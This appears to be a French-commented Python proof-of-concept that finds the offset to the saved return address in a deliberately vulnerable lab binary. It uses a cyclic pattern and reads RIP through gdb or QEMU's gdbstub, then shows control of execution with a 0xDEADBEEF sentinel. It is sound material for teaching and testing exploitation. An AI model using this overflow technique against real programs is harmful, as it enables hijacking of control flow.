#!/usr/bin/env python3
"""PoC : contrôle de RIP sur 01_stack_bof_vuln via cyclic pattern.

Lit le RIP au moment du crash pour déduire l'offset buffer -> saved RIP, puis
prouve le contrôle du flot en plaçant une sentinelle à cet offset.

Deux transports selon l'environnement :
  - gdb + ptrace en natif (x86-64 réel) ;
  - repli gdbstub QEMU user quand le ptrace échoue (ex. binaire x86-64 émulé
    sous Rosetta/Docker : l'état registre invité n'est lisible ni par ptrace ni
    dans le core, seul le gdbstub de qemu-x86_64 l'expose).
"""

from __future__ import annotations

import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time

from pwn import cyclic, cyclic_find, p64

from pipeline import colors

SENTINELLE = 0xDEADBEEF
_RIP_RE = re.compile(r"RIP=(0x[0-9a-f]+)")

_OK = colors.paint("[OK]", "green", "bold")
_PLUS = colors.paint("[+]", "green")
_STAR = colors.paint("[*]", "blue")
_BANG = colors.paint("[!]", "red")


def _val(text: str) -> str:
    return colors.paint(text, "magenta")


def _rip_from_gdb(sortie: str) -> int | None:
    m = _RIP_RE.search(sortie)
    return int(m.group(1), 16) if m else None


def _crash_rip_ptrace(binary: str, data: bytes) -> int | None:
    """RIP au crash via gdb natif (ptrace). None si le ptrace n'est pas dispo."""
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(data)
        chemin = tf.name
    try:
        sortie = subprocess.run(
            ["gdb", "-q", "-batch", "-nx",
             "-ex", "set debuginfod enabled off",
             "-ex", "set pagination off",
             "-ex", f"run < {chemin}",
             "-ex", 'printf "RIP=%#lx\\n", $rip',
             binary],
            capture_output=True, text=True, timeout=60,
        ).stdout
    except (subprocess.SubprocessError, OSError):
        return None
    finally:
        os.unlink(chemin)
    return _rip_from_gdb(sortie)


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _crash_rip_qemu(binary: str, data: bytes) -> int | None:
    """RIP au crash via le gdbstub de qemu-x86_64 (contourne ptrace et Rosetta)."""
    qemu = shutil.which("qemu-x86_64")
    if qemu is None:
        return None
    port = _free_port()
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(data)
        chemin = tf.name
    entree = open(chemin, "rb")
    try:
        proc = subprocess.Popen(
            [qemu, "-g", str(port), binary],
            stdin=entree, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        # qemu -g bloque tant qu'aucun gdb n'est connecté : on laisse juste le
        # temps au gdbstub de binder (ne PAS sonder le port en s'y connectant,
        # ce qui consommerait l'unique connexion cliente du stub).
        time.sleep(0.8)
        sortie = subprocess.run(
            ["gdb", "-q", "-batch", "-nx",
             "-ex", "set tcp connect-timeout 10",
             "-ex", f"target remote 127.0.0.1:{port}",
             "-ex", "continue",
             "-ex", 'printf "RIP=%#lx\\n", $rip',
             binary],
            capture_output=True, text=True, timeout=60,
        ).stdout
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    except (subprocess.SubprocessError, OSError):
        return None
    finally:
        entree.close()
        os.unlink(chemin)
    return _rip_from_gdb(sortie)


def crash_rip(binary: str, data: bytes) -> tuple[int | None, str]:
    """RIP au crash + nom du transport utilisé."""
    rip = _crash_rip_ptrace(binary, data)
    if rip is not None:
        return rip, "gdb/ptrace"
    rip = _crash_rip_qemu(binary, data)
    if rip is not None:
        return rip, "qemu-gdbstub"
    return None, "aucun"


def main() -> int:
    defaut = os.path.join(os.path.dirname(__file__), "..", "corpus", "build", "01_stack_bof_vuln")
    binary = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else defaut)
    if not os.path.exists(binary):
        print(f"{_BANG} binaire introuvable : {binary}")
        return 1
    print(f"{_STAR} Cible : {binary}")

    motif = cyclic(300, n=8)
    rip, transport = crash_rip(binary, motif)
    if rip is None:
        print(f"{_BANG} impossible de lire le RIP au crash (ni ptrace ni gdbstub QEMU).")
        print("    Sous Rosetta/Docker, installer qemu-user, ou rejouer sur x86-64 natif.")
        return 1
    print(f"{_STAR} Transport : {_val(transport)}")

    offset = cyclic_find(p64(rip), n=8)
    if offset < 0:
        print(f"{_BANG} RIP au crash ({rip:#x}) hors du motif cyclique — offset introuvable.")
        return 1
    print(f"{_PLUS} RIP écrasé par le motif : {_val(f'{rip:#018x}')}")
    print(f"{_PLUS} Offset buffer -> saved RIP : {_val(f'{offset} octets')}")

    payload = b"A" * offset + p64(SENTINELLE)
    rip, _ = crash_rip(binary, payload)
    print(f"{_PLUS} Payload : {offset} x 'A' + p64({SENTINELLE:#x})")
    if rip is None:
        print(f"{_BANG} RIP illisible sur le payload final.")
        return 1
    print(f"{_PLUS} RIP au moment du crash : {_val(f'{rip:#x}')}")
    if rip == SENTINELLE:
        print(f"{_OK} Contrôle de RIP démontré : RIP = {_val(f'{SENTINELLE:#x}')}.")
        return 0
    print(f"{_BANG} Contrôle de RIP non confirmé.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
